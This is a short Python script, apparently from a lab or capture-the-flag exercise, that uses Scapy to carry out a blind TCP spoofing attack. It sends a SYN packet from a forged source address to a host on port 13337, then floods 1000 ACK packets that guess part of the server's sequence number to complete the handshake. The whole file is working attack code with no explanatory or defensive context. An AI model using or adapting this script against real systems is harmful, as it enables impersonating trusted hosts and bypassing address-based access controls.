from scapy.all import *
import time
import random
payload = Raw('172.16.44.5')
fake = '10.2.4.10'
my = '172.16.44.5'
ip = IP(src = fake,dst = '172.16.44.1')

#while (True):
SYN1 = TCP(dport = 13337,sport =1024, flags = "S",seq = 1234)
SYNACK = send(ip/SYN1/payload)


list = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f']
for i in range(1000):    
    r1= random.randint(0,15)
    r2 = random.randint(0,15)
    s_16 = 'a7'+ list[r1]+list[r2]+'5f'+'79'
    ack_num = int(s_16 ,16)+1
    #print(s_16,hex(ack_num-1))
    #time.sleep(1)
    ACK = TCP(flags = 'A',seq = 1235, ack = ack_num ,dport = 13337,sport=1024 )
    send(ip/ACK/payload)
    #time.sleep(10)






